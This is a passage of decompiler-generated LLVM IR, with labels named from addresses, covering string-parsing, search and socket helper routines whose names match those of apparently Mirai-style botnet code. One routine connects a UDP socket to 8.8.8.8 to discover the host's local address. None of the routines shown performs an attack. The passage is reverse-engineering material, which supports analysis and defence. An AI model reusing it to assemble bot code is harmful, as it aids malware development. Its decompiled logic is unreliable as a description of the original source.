dec_label_pc_10410:                               ; preds = %dec_label_pc_103fc
  %v1_10410 = load i32, i32* @r0, align 4
  ret i32 %v1_10410

; uselistorder directives
  uselistorder i32 %v1_10404, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_10428 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_10428, label %dec_label_pc_10430, label %dec_label_pc_10438

dec_label_pc_10430:                               ; preds = %dec_label_pc_1044c, %dec_label_pc_10438, %entry, %dec_label_pc_10478
  %storemerge = phi i32 [ %v1_10478, %dec_label_pc_10478 ], [ -1, %entry ], [ -1, %dec_label_pc_10438 ], [ -1, %dec_label_pc_1044c ]
  ret i32 %storemerge

dec_label_pc_10438:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_10430, label %dec_label_pc_10440

dec_label_pc_10440:                               ; preds = %dec_label_pc_10438
  br label %dec_label_pc_10458

dec_label_pc_1044c:                               ; preds = %bb, %dec_label_pc_1046c
  %v1_104583 = phi i32 [ %v1_1046c, %dec_label_pc_1046c ], [ 0, %bb ]
  %v1_1044c = add i32 %v0_10478, 1
  %v9_10450 = icmp eq i32 %v1_1044c, %arg2
  br i1 %v9_10450, label %dec_label_pc_10430, label %dec_label_pc_10458

dec_label_pc_10458:                               ; preds = %dec_label_pc_1044c, %dec_label_pc_10440
  %v0_10478 = phi i32 [ %v1_1044c, %dec_label_pc_1044c ], [ 0, %dec_label_pc_10440 ]
  %v1_10458 = phi i32 [ %v1_104583, %dec_label_pc_1044c ], [ 0, %dec_label_pc_10440 ]
  %v2_10458 = add i32 %v1_10458, %arg3
  %v3_10458 = inttoptr i32 %v2_10458 to i8*
  %v4_10458 = load i8, i8* %v3_10458, align 1
  %v2_1045c = add i32 %v0_10478, %arg1
  %v3_1045c = inttoptr i32 %v2_1045c to i8*
  %v4_1045c = load i8, i8* %v3_1045c, align 1
  %v9_10460 = icmp eq i8 %v4_1045c, %v4_10458
  br i1 %v9_10460, label %dec_label_pc_1046c, label %bb

bb:                                               ; preds = %dec_label_pc_10458
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1044c

dec_label_pc_1046c:                               ; preds = %dec_label_pc_10458
  %v1_1046c = add i32 %v1_10458, 1
  store i32 %v1_1046c, i32* @ip, align 4
  %v9_10470 = icmp eq i32 %v1_1046c, %arg4
  br i1 %v9_10470, label %dec_label_pc_10478, label %dec_label_pc_1044c

dec_label_pc_10478:                               ; preds = %dec_label_pc_1046c
  %v1_10478 = add i32 %v0_10478, 1
  br label %dec_label_pc_10430

; uselistorder directives
  uselistorder i32 %v1_1046c, { 1, 2, 0 }
  uselistorder i32 %v1_10458, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1044c, { 1, 0 }
  uselistorder label %dec_label_pc_10430, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_10490

dec_label_pc_10490:                               ; preds = %.thread, %dec_label_pc_104a4, %bb, %entry
  %v0_10490 = phi i32 [ %tmp, %entry ], [ %v5_10490, %bb ], [ %v5_10490, %dec_label_pc_104a4 ], [ %v5_10490, %.thread ]
  %v1_10490 = inttoptr i32 %v0_10490 to i8*
  %v2_10490 = load i8, i8* %v1_10490, align 1
  %v5_10490 = add i32 %v0_10490, 1
  %v7_10494 = icmp eq i8 %v2_10490, 9
  br i1 %v7_10494, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10490
  br label %dec_label_pc_10490

bb:                                               ; preds = %dec_label_pc_10490
  %v8_10498 = icmp eq i8 %v2_10490, 32
  br i1 %v8_10498, label %dec_label_pc_10490, label %dec_label_pc_104a4

dec_label_pc_104a4:                               ; preds = %bb
  %v7_104a4 = icmp eq i8 %v2_10490, 10
  br i1 %v7_104a4, label %dec_label_pc_10490, label %dec_label_pc_104ac

dec_label_pc_104ac:                               ; preds = %dec_label_pc_104a4
  %v7_104ac = icmp eq i8 %v2_10490, 45
  br i1 %v7_104ac, label %dec_label_pc_1059c, label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %dec_label_pc_104ac
  %v7_104b4 = icmp eq i8 %v2_10490, 43
  br i1 %v7_104b4, label %bb54, label %dec_label_pc_104c4

bb54:                                             ; preds = %dec_label_pc_104b4
  %v2_104b8 = inttoptr i32 %v5_10490 to i8*
  %v3_104b8 = load i8, i8* %v2_104b8, align 1
  %v6_104b8 = add i32 %v0_10490, 2
  br label %dec_label_pc_104c4

dec_label_pc_104c4:                               ; preds = %bb54, %dec_label_pc_104b4, %dec_label_pc_1059c
  %v1_1056c39 = phi i32 [ %v5_1059c, %dec_label_pc_1059c ], [ %v5_10490, %dec_label_pc_104b4 ], [ %v6_104b8, %bb54 ]
  %v0_104ec10.in = phi i8 [ %v2_1059c, %dec_label_pc_1059c ], [ %v2_10490, %dec_label_pc_104b4 ], [ %v3_104b8, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_1059c ], [ 2147483647, %dec_label_pc_104b4 ], [ 2147483647, %bb54 ]
  %v0_105ac = phi i32 [ 1, %dec_label_pc_1059c ], [ 0, %dec_label_pc_104b4 ], [ 0, %bb54 ]
  %v2_104cc = udiv i32 %storemerge1, %arg2
  %v3_104cc = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_104ec.outer

dec_label_pc_104ec.outer:                         ; preds = %.thread5, %dec_label_pc_104c4
  %v1_1056c.ph = phi i32 [ %v6_1056c, %.thread5 ], [ %v1_1056c39, %dec_label_pc_104c4 ]
  %v2_10568.ph = phi i32 [ %v5_10568, %.thread5 ], [ 0, %dec_label_pc_104c4 ]
  %v1_1052c.ph.in = phi i8 [ %v3_1056c, %.thread5 ], [ %v0_104ec10.in, %dec_label_pc_104c4 ]
  %v1_10544.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_104c4 ]
  %v3_10538 = icmp uge i32 %v2_10568.ph, %v2_104cc
  %v9_10538 = icmp eq i32 %v2_10568.ph, %v2_104cc
  %v2_1053c = xor i1 %v3_10538, true
  %v3_1053c = or i1 %v9_10538, %v2_1053c
  %v2_10540 = xor i1 %v9_10538, true
  %v3_10540 = and i1 %v3_10538, %v2_10540
  %v2_10560 = icmp eq i1 %v9_10538, false
  br label %dec_label_pc_104ec

dec_label_pc_104ec:                               ; preds = %dec_label_pc_104ec.outer, %dec_label_pc_10574
  %v1_1056c = phi i32 [ %v5_10574, %dec_label_pc_10574 ], [ %v1_1056c.ph, %dec_label_pc_104ec.outer ]
  %v1_10544 = phi i32 [ -1, %dec_label_pc_10574 ], [ %v1_10544.ph, %dec_label_pc_104ec.outer ]
  %v1_1052c.in = phi i8 [ %v2_10574, %dec_label_pc_10574 ], [ %v1_1052c.ph.in, %dec_label_pc_104ec.outer ]
  %v1_1052c = zext i8 %v1_1052c.in to i32
  %v1_104ec = urem i32 %v1_1052c, 256
  %v1_104f0 = add nsw i32 %v1_104ec, -48
  %v1_104f8 = add nsw i32 %v1_104ec, -97
  %v1_104fc = add nsw i32 %v1_1052c, -48
  %v1_10500 = add nsw i32 %v1_104ec, -65
  %tmp87 = icmp ult i32 %v1_104f0, 10
  br i1 %tmp87, label %dec_label_pc_10530, label %dec_label_pc_10508

dec_label_pc_10508:                               ; preds = %dec_label_pc_104ec
  %v2_10508 = icmp ugt i32 %v1_10500, 24
  %v7_10508 = icmp eq i32 %v1_10500, 25
  %v2_1050c = xor i1 %v7_10508, true
  %v3_1050c = and i1 %v2_10508, %v2_1050c
  br i1 %v3_1050c, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_10508
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_10508, %bb55
  %v0_1052015 = phi i32 [ %v1_104fc, %dec_label_pc_10508 ], [ 0, %bb55 ]
  %v2_10510 = xor i1 %v2_10508, true
  %v3_10510 = or i1 %v7_10508, %v2_10510
  br i1 %v3_10510, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_10520 = phi i32 [ %v0_1052015, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_1050c, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_10518 = icmp ugt i32 %v1_104f8, 24
  %v11_10518 = icmp eq i32 %v1_104f8, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_1051c = phi i1 [ %v7_10508, %bb58 ], [ %v11_10518, %bb59 ]
  %v0_1051c = phi i1 [ %v2_10508, %bb58 ], [ %v6_10518, %bb59 ]
  %v2_1051c = xor i1 %v1_1051c, true
  %v3_1051c = and i1 %v0_1051c, %v2_1051c
  br i1 %v3_1051c, label %dec_label_pc_10580, label %dec_label_pc_10520

dec_label_pc_10520:                               ; preds = %bb60
  %v2_10520 = icmp eq i32 %v0_10520, 0
  %. = select i1 %v2_10520, i32 87, i32 55
  %v2_1052c = sub nsw i32 %v1_1052c, %.
  br label %dec_label_pc_10530

dec_label_pc_10530:                               ; preds = %dec_label_pc_104ec, %dec_label_pc_10520
  %v0_1054433 = phi i32 [ %v1_10500, %dec_label_pc_104ec ], [ %., %dec_label_pc_10520 ]
  %v3_10568 = phi i32 [ %v1_104fc, %dec_label_pc_104ec ], [ %v2_1052c, %dec_label_pc_10520 ]
  %v2_10530 = sub i32 %v3_10568, %arg2
  %v4_10530 = xor i32 %v3_10568, %arg2
  %v5_10530 = xor i32 %v2_10530, %v3_10568
  %v6_10530 = and i32 %v5_10530, %v4_10530
  %v7_10530 = icmp slt i32 %v6_10530, 0
  %v8_10530 = icmp slt i32 %v2_10530, 0
  %v2_10534 = xor i1 %v8_10530, %v7_10530
  br i1 %v2_10534, label %dec_label_pc_10538, label %dec_label_pc_10580

dec_label_pc_10538:                               ; preds = %dec_label_pc_10530
  br i1 %v3_1053c, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_10538
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_10538, %bb63
  %v0_1054432 = phi i32 [ %v0_1054433, %dec_label_pc_10538 ], [ 0, %bb63 ]
  br i1 %v3_10540, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_10544 = phi i32 [ %v0_1054432, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_10544, 0
  %v4_10544 = zext i1 %tmp88 to i32
  %v5_10544 = or i32 %v0_10544, %v4_10544
  %v7_10544 = icmp eq i32 %v5_10544, 0
  br i1 %v7_10544, label %dec_label_pc_1054c, label %dec_label_pc_10574

dec_label_pc_1054c:                               ; preds = %bb66
  %v2_10558 = sub i32 %v3_10568, %v3_104cc
  %v4_10558 = xor i32 %v3_10568, %v3_104cc
  %v5_10558 = xor i32 %v2_10558, %v3_10568
  %v6_10558 = and i32 %v5_10558, %v4_10558
  %v7_10558 = icmp slt i32 %v6_10558, 0
  %v8_10558 = icmp slt i32 %v2_10558, 0
  %v9_10558 = icmp eq i32 %v3_10568, %v3_104cc
  %v3_1055c = xor i1 %v8_10558, %v7_10558
  %v4_1055c = or i1 %v9_10558, %v3_1055c
  br i1 %v4_1055c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_1054c
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_1054c
  br i1 %v2_10560, label %.thread5, label %dec_label_pc_10574

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_10568 = mul i32 %v2_10568.ph, %arg2
  %v5_10568 = add i32 %v3_10568, %v4_10568
  %v2_1056c = inttoptr i32 %v1_1056c to i8*
  %v3_1056c = load i8, i8* %v2_1056c, align 1
  %v6_1056c = add i32 %v1_1056c, 1
  br label %dec_label_pc_104ec.outer

dec_label_pc_10574:                               ; preds = %thread-pre-split, %bb66
  %v1_10574 = inttoptr i32 %v1_1056c to i8*
  %v2_10574 = load i8, i8* %v1_10574, align 1
  %v5_10574 = add i32 %v1_1056c, 1
  br label %dec_label_pc_104ec

dec_label_pc_10580:                               ; preds = %dec_label_pc_10530, %bb60
  %v1_10580 = icmp slt i32 %v1_10544, 0
  %v2_105ac = icmp eq i32 %v0_105ac, 0
  br i1 %v1_10580, label %dec_label_pc_105ac, label %dec_label_pc_10588

dec_label_pc_10588:                               ; preds = %dec_label_pc_10580
  br i1 %v2_105ac, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_10588
  %v2_1058c = sub i32 0, %v2_10568.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_10588, %bb69
  %v1_10598 = phi i32 [ -2147483648, %bb71 ], [ %v2_10568.ph, %dec_label_pc_10588 ], [ %v2_1058c, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_10598

dec_label_pc_1059c:                               ; preds = %dec_label_pc_104ac
  %v1_1059c = inttoptr i32 %v5_10490 to i8*
  %v2_1059c = load i8, i8* %v1_1059c, align 1
  %v5_1059c = add i32 %v0_10490, 2
  br label %dec_label_pc_104c4

dec_label_pc_105ac:                               ; preds = %dec_label_pc_10580
  br i1 %v2_105ac, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_105ac
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_105ac
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_105ac, { 1, 0 }
  uselistorder i32 %v2_10558, { 1, 0 }
  uselistorder i32 %v2_10530, { 1, 0 }
  uselistorder i32 %v3_10568, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_10508, { 1, 2, 0 }
  uselistorder i1 %v2_10508, { 1, 0, 2 }
  uselistorder i32 %v1_104ec, { 1, 2, 0 }
  uselistorder i32 %v1_1052c, { 1, 0, 2 }
  uselistorder i32 %v1_10544, { 1, 0 }
  uselistorder i32 %v1_1056c, { 2, 3, 1, 0 }
  uselistorder i1 %v9_10538, { 1, 0, 2 }
  uselistorder i1 %v3_10538, { 1, 0 }
  uselistorder i32 %v2_10568.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_104cc, { 1, 0, 2 }
  uselistorder i32 %v2_104cc, { 1, 0 }
  uselistorder i32 %v5_10490, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_10490, { 0, 1, 3, 2 }
  uselistorder i32 25, { 18, 19, 9, 2, 10, 3, 11, 4, 12, 0, 13, 5, 14, 1, 15, 6, 7, 16, 8, 17 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_10530, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_104ec, { 1, 0 }
  uselistorder label %dec_label_pc_104c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10490, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_105bc = load i32, i32* @r4, align 4
  store i32 %v3_105bc, i32* %stack_var_-24, align 4
  %v6_105bc = load i32, i32* @r5, align 4
  %v9_105bc = load i32, i32* @r6, align 4
  %v12_105bc = load i32, i32* @r7, align 4
  %v15_105bc = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_105d4

dec_label_pc_105d4:                               ; preds = %dec_label_pc_105f8.dec_label_pc_105d4_crit_edge, %entry
  %v0_105d8 = phi i32 [ %v0_105d8.pre, %dec_label_pc_105f8.dec_label_pc_105d4_crit_edge ], [ %arg3, %entry ]
  %v0_105d4 = phi i32 [ %v5_105f8, %dec_label_pc_105f8.dec_label_pc_105d4_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_105d4, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_105e0 = call i32 @__libc_read(i32 %v0_105d8)
  %v7_105e4 = icmp eq i32 %v1_105e0, 1
  %v0_105ec = load i32, i32* @r5, align 4
  br i1 %v7_105e4, label %dec_label_pc_105ec, label %dec_label_pc_10604

dec_label_pc_105ec:                               ; preds = %dec_label_pc_105d4
  %v1_105ec = add i32 %v0_105ec, 1
  store i32 %v1_105ec, i32* @r5, align 4
  %v1_105f0 = load i32, i32* @r8, align 4
  %v6_105f4 = icmp slt i32 %v1_105ec, %v1_105f0
  br i1 %v6_105f4, label %dec_label_pc_105f8, label %.loopexit

dec_label_pc_105f8:                               ; preds = %dec_label_pc_105ec
  %v0_105f8 = load i32, i32* @r4, align 4
  %v1_105f8 = inttoptr i32 %v0_105f8 to i8*
  %v2_105f8 = load i8, i8* %v1_105f8, align 1
  %v3_105f8 = zext i8 %v2_105f8 to i32
  store i32 %v3_105f8, i32* @r3, align 4
  %v5_105f8 = add i32 %v0_105f8, 1
  store i32 %v5_105f8, i32* @r4, align 4
  %v7_105fc = icmp eq i8 %v2_105f8, 10
  br i1 %v7_105fc, label %dec_label_pc_10604, label %dec_label_pc_105f8.dec_label_pc_105d4_crit_edge

dec_label_pc_105f8.dec_label_pc_105d4_crit_edge:  ; preds = %dec_label_pc_105f8
  %v0_105d8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_105d4

dec_label_pc_10604:                               ; preds = %dec_label_pc_105d4, %dec_label_pc_105f8
  %v0_10604 = phi i32 [ %v1_105ec, %dec_label_pc_105f8 ], [ %v0_105ec, %dec_label_pc_105d4 ]
  %v2_10604 = icmp eq i32 %v0_10604, 0
  br i1 %v2_10604, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_10604
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_105ec, %dec_label_pc_10604, %bb
  %v0_1060c = load i32, i32* @r7, align 4
  %v2_10610 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10610, i32* @r4, align 4
  store i32 %v6_105bc, i32* @r5, align 4
  store i32 %v9_105bc, i32* @r6, align 4
  store i32 %v12_105bc, i32* @r7, align 4
  store i32 %v15_105bc, i32* @r8, align 4
  ret i32 %v0_1060c

; uselistorder directives
  uselistorder i32 %v5_105f8, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10604, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10618 = load i32, i32* @r4, align 4
  %v6_10618 = load i32, i32* @r5, align 4
  %v9_10618 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_10628 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10630 = inttoptr i32 %v0_10628 to i32*
  store i32 0, i32* %v2_10630, align 4
  %v0_1063c = load i32, i32* %r4.global-to-local, align 4
  %v3_10640 = call i32 @socket(i32 2, i32 2, i32 %v0_1063c)
  %v7_10644 = icmp eq i32 %v3_10640, -1
  store i32 %v3_10640, i32* @r5, align 4
  br i1 %v7_10644, label %bb, label %dec_label_pc_10654

bb:                                               ; preds = %entry
  %v1_1064c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_106a0

dec_label_pc_10654:                               ; preds = %entry
  %v2_10660 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10660, i32* @r4, align 4
  %v0_1066c = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10680 = call i32 @__libc_connect(i32 %v3_10640, i32 %v2_10660, i32 %v0_1066c)
  store i32 %v2_10660, i32* @r1, align 4
  %v2_10688 = ptrtoint i32* %stack_var_-20 to i32
  %v0_1068c = load i32, i32* @r5, align 4
  %v3_10690 = call i32 @__GI_getsockname(i32 %v0_1068c, i32 %v2_10660, i32 %v2_10688)
  %v0_10694 = load i32, i32* @r5, align 4
  %v1_10698 = call i32 @__GI___libc_close(i32 %v0_10694)
  br label %dec_label_pc_106a0

dec_label_pc_106a0:                               ; preds = %bb, %dec_label_pc_10654
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10654 ], [ %v1_1064c, %bb ]
  store i32 %v3_10618, i32* @r4, align 4
  store i32 %v6_10618, i32* @r5, align 4
  store i32 %v9_10618, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10660, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10640, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 8, 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 23, 24, 22, 4, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 0, 10, 9, 8, 7, 6, 5, 1, 3, 2 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_106a0, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_106b0 = load i8, i8* %tmp, align 1
  %v4_106b0 = zext i8 %v3_106b0 to i32
  store i32 %v4_106b0, i32* @r3, align 4
  %v2_106b4 = icmp eq i8 %v3_106b0, 0
  br i1 %v2_106b4, label %bb, label %dec_label_pc_106c8

bb:                                               ; preds = %entry
  br label %dec_label_pc_106dc

dec_label_pc_106c8:                               ; preds = %entry
  br label %dec_label_pc_106cc

dec_label_pc_106cc:                               ; preds = %dec_label_pc_106cc, %dec_label_pc_106c8
  %v0_106cc = phi i32 [ %v1_106cc, %dec_label_pc_106cc ], [ 0, %dec_label_pc_106c8 ]
  %v1_106cc = add i32 %v0_106cc, 1
  %v2_106d0 = add i32 %v1_106cc, %arg2
  %v3_106d0 = inttoptr i32 %v2_106d0 to i8*
  %v4_106d0 = load i8, i8* %v3_106d0, align 1
  %v6_106d0 = zext i8 %v4_106d0 to i32
  store i32 %v6_106d0, i32* @r3, align 4
  %v2_106d4 = icmp eq i8 %v4_106d0, 0
  br i1 %v2_106d4, label %dec_label_pc_106dc, label %dec_label_pc_106cc

dec_label_pc_106dc:                               ; preds = %dec_label_pc_106cc, %bb
  %v0_1072021 = phi i32 [ %v4_106b0, %bb ], [ %v1_106cc, %dec_label_pc_106cc ]
  %v0_106e42 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_106e42, 1
  br i1 %tmp29, label %dec_label_pc_10734, label %dec_label_pc_106f0

dec_label_pc_106f0:                               ; preds = %dec_label_pc_106dc, %dec_label_pc_106e4.backedge
  %v0_106e8.in = phi i32 [ %v0_106e8, %dec_label_pc_106e4.backedge ], [ %v0_106e42, %dec_label_pc_106dc ]
  %v1_106fc = phi i32 [ %v1_106fc15, %dec_label_pc_106e4.backedge ], [ 0, %dec_label_pc_106dc ]
  %v0_106f0 = phi i32 [ %v5_106f0, %dec_label_pc_106e4.backedge ], [ %tmp23, %dec_label_pc_106dc ]
  %v0_106e8 = add i32 %v0_106e8.in, -1
  %v1_106f0 = inttoptr i32 %v0_106f0 to i8*
  %v2_106f0 = load i8, i8* %v1_106f0, align 1
  %v3_106f0 = zext i8 %v2_106f0 to i32
  %v5_106f0 = add i32 %v0_106f0, 1
  %v1_106f4 = add nsw i32 %v3_106f0, -65
  %v2_106fc = add i32 %v1_106fc, %arg2
  %v3_106fc = inttoptr i32 %v2_106fc to i8*
  %v4_106fc = load i8, i8* %v3_106fc, align 1
  %v6_106fc = zext i8 %v4_106fc to i32
  store i32 %v6_106fc, i32* @r3, align 4
  %v1_10700 = add nsw i32 %v6_106fc, -65
  %tmp38 = icmp ult i32 %v1_106f4, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_106f0
  %v5_10704 = or i32 %v3_106f0, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_106f0, %bb30
  %v0_10710 = phi i32 [ %v3_106f0, %dec_label_pc_106f0 ], [ %v5_10704, %bb30 ]
  %tmp39 = icmp ult i32 %v1_10700, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_1070c = or i32 %v6_106fc, 96
  store i32 %v5_1070c, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_10710 = phi i32 [ %v6_106fc, %bb31 ], [ %v5_1070c, %bb32 ]
  %v9_10710 = icmp eq i32 %v0_10710, %v1_10710
  br i1 %v9_10710, label %dec_label_pc_1071c, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_106e4.backedge

dec_label_pc_106e4.backedge:                      ; preds = %bb34, %dec_label_pc_1071c
  %v1_106fc15 = phi i32 [ 0, %bb34 ], [ %v1_1071c, %dec_label_pc_1071c ]
  %tmp35 = icmp slt i32 %v0_106e8, 1
  br i1 %tmp35, label %dec_label_pc_10734, label %dec_label_pc_106f0

dec_label_pc_1071c:                               ; preds = %bb33
  %v1_1071c = add i32 %v1_106fc, 1
  %v9_10720 = icmp eq i32 %v0_1072021, %v1_1071c
  br i1 %v9_10720, label %dec_label_pc_10728, label %dec_label_pc_106e4.backedge

dec_label_pc_10728:                               ; preds = %dec_label_pc_1071c
  %v2_10728 = sub i32 %v5_106f0, %tmp23
  br label %dec_label_pc_10734

dec_label_pc_10734:                               ; preds = %dec_label_pc_106e4.backedge, %dec_label_pc_106dc, %dec_label_pc_10728
  %storemerge = phi i32 [ %v2_10728, %dec_label_pc_10728 ], [ -1, %dec_label_pc_106dc ], [ -1, %dec_label_pc_106e4.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_1071c, { 1, 0 }
  uselistorder i32 %v0_106f0, { 1, 0 }
  uselistorder i32 %v1_106fc, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_10734, { 2, 0, 1 }
  uselistorder label %dec_label_pc_106e4.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_106f0, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_1073c = load i8, i8* %arg1, align 1
  %v2_10740 = icmp eq i8 %v2_1073c, 0
  br i1 %v2_10740, label %bb, label %dec_label_pc_1074c

bb:                                               ; preds = %entry
  %v3_1073c = zext i8 %v2_1073c to i32
  br label %dec_label_pc_10760

dec_label_pc_1074c:                               ; preds = %entry
  br label %dec_label_pc_10750

dec_label_pc_10750:                               ; preds = %dec_label_pc_10750, %dec_label_pc_1074c
  %v0_10750 = phi i32 [ %v1_10750, %dec_label_pc_10750 ], [ 0, %dec_label_pc_1074c ]
  %v1_10750 = add i32 %v0_10750, 1
  %v2_10754 = add i32 %v1_10750, %tmp
  %v3_10754 = inttoptr i32 %v2_10754 to i8*
  %v4_10754 = load i8, i8* %v3_10754, align 1
  %v2_10758 = icmp eq i8 %v4_10754, 0
  br i1 %v2_10758, label %dec_label_pc_10760, label %dec_label_pc_10750

dec_label_pc_10760:                               ; preds = %dec_label_pc_10750, %bb
  %v0_107ac3 = phi i32 [ %v3_1073c, %bb ], [ %v1_10750, %dec_label_pc_10750 ]
  %v1_10760 = inttoptr i32 %arg2 to i8*
  %v2_10760 = load i8, i8* %v1_10760, align 1
  %v3_10760 = zext i8 %v2_10760 to i32
  store i32 %v3_10760, i32* @r3, align 4
  %v2_10764 = icmp eq i8 %v2_10760, 0
  br i1 %v2_10764, label %bb21, label %dec_label_pc_10770

bb21:                                             ; preds = %dec_label_pc_10760
  store i32 %v3_10760, i32* @r2, align 4
  br label %dec_label_pc_10784

dec_label_pc_10770:                               ; preds = %dec_label_pc_10760
  br label %dec_label_pc_10774

dec_label_pc_10774:                               ; preds = %dec_label_pc_10774, %dec_label_pc_10770
  %v0_10774 = phi i32 [ %v1_10774, %dec_label_pc_10774 ], [ 0, %dec_label_pc_10770 ]
  %v1_10774 = add i32 %v0_10774, 1
  store i32 %v1_10774, i32* @r2, align 4
  %v2_10778 = add i32 %v1_10774, %arg2
  %v3_10778 = inttoptr i32 %v2_10778 to i8*
  %v4_10778 = load i8, i8* %v3_10778, align 1
  %v6_10778 = zext i8 %v4_10778 to i32
  store i32 %v6_10778, i32* @r3, align 4
  %v2_1077c = icmp eq i8 %v4_10778, 0
  br i1 %v2_1077c, label %dec_label_pc_10784, label %dec_label_pc_10774

dec_label_pc_10784:                               ; preds = %dec_label_pc_10774, %bb21
  %v0_10784 = phi i32 [ %v3_10760, %bb21 ], [ %v1_10774, %dec_label_pc_10774 ]
  %v9_10784 = icmp eq i32 %v0_10784, %v0_107ac3
